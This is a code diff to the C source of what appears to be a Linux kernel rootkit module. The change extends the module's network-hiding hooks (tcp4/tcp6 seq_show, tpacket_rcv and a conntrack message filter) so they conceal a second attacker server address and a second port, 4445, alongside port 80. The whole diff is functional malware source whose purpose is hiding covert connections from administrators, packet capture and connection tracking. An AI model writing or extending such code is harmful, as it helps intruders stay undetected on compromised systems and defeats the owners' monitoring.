@@ -4,6 +4,7 @@
 #include "../ftrace/ftrace_helper.h"
 
 #define PORT 80
+#define PORT2 4445
 
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
@@ -13,24 +14,28 @@ static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                                 struct packet_type *pt, struct net_device *orig_dev);
 
 static const struct in6_addr ipv6_ip_ = YOUR_SRV_IPv6;
+static const struct in6_addr ipv6_ip2_ = YOUR_SRV_IPv6_2;
 static __be32 cached_ipv4 = 0;
+static __be32 cached_ipv4_2 = 0;
 
 static inline void init_cached_ip(void) {
     if (unlikely(cached_ipv4 == 0))
         cached_ipv4 = in_aton(YOUR_SRV_IP);
+    if (unlikely(cached_ipv4_2 == 0))
+        cached_ipv4_2 = in_aton(YOUR_SRV_IP2);
 }
 
 static inline bool is_hidden_port(u16 port) {
-    return (port == PORT);
+    return (port == PORT || port == PORT2);
 }
 
 static inline bool is_hidden_ipv4(__be32 addr) {
     init_cached_ip();
-    return (addr == cached_ipv4);
+    return (addr == cached_ipv4 || addr == cached_ipv4_2);
 }
 
 static inline bool is_hidden_ipv6(const struct in6_addr *addr) {
-    return ipv6_addr_equal(addr, &ipv6_ip_);
+    return ipv6_addr_equal(addr, &ipv6_ip_) || ipv6_addr_equal(addr, &ipv6_ip2_);
 }
 
 static notrace bool should_hide_sock(struct sock *sk)
@@ -322,7 +327,8 @@ notrace long filter_conntrack_messages(unsigned char *buf, long len)
     long new_len = 0;
     bool any_filtered = false;
     unsigned char *ip_bytes = (unsigned char *)&cached_ipv4;
-    
+    unsigned char *ip2_bytes = (unsigned char *)&cached_ipv4_2;
+
     init_cached_ip();
     
     if (len <= 0 || len > 131072)
@@ -352,7 +358,8 @@ notrace long filter_conntrack_messages(unsigned char *buf, long len)
             unsigned int i;
             
             for (i = 0; i <= search_len - 4; i++) {
-                if (memcmp(search_pos + i, ip_bytes, 4) == 0) {
+                if (memcmp(search_pos + i, ip_bytes, 4) == 0 ||
+                    memcmp(search_pos + i, ip2_bytes, 4) == 0) {
                     hide = true;
                     any_filtered = true;
                     break;
